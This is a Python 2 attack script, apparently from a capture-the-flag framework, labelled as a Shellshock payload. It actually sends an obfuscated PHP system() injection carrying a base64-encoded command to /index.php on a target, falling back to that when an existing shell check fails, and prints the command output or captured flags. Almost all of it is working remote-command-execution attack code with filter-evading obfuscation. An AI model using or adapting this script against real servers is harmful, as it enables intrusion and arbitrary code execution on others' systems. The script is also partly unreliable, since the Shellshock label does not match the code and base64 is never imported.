#!/usr/bin/env python

from http import http
from config import *
from function import *
import urllib

'''
this is the payload script for vuln shellshock

'''


def attack(target,cmd,get_flag):
    is_vuln = 1
    flag = "hello world!"
    info = "success"
    reserve = 0    

    if check_shell(target,""):
	res = execute_shell(target,cmd)
    else:
	dump_warning(target,"check_shell failed","function.py check_shell")
	'''
	
	'''
	try:	   
	    cmd = urllib.unquote(cmd) 
	    cmd = base64.b64encode(cmd)
	    print cmd
	    data = "<?php $a='sy'.'stem';$b = '%s';$a(base64_decode($b));?>"%cmd
	    res = http("post",target,target_port,"/index.php?f=a",data,{})
	    print len(res)
	except Exception,e:
	    print e
	    dump_error(target,"attack failed","sample.py attack")
	    res = "error"

    if get_flag:
	if check_flag(res):
	    flag = res
	    print "flag => " + res.replace(" ","").replace("\n","")
	else:
	    dump_warning(target,"flag format error,you may need to rewrite the shell", "sample.py attack")
    elif res=="error":
	pass
    else:
	dump_success(target,"execution cmd","sample.py")
	if len(res)<1000:
    	    print res
	else:
	    print res[:200]


    print "testing ..........."
    return flag,is_vuln,info,reserve 



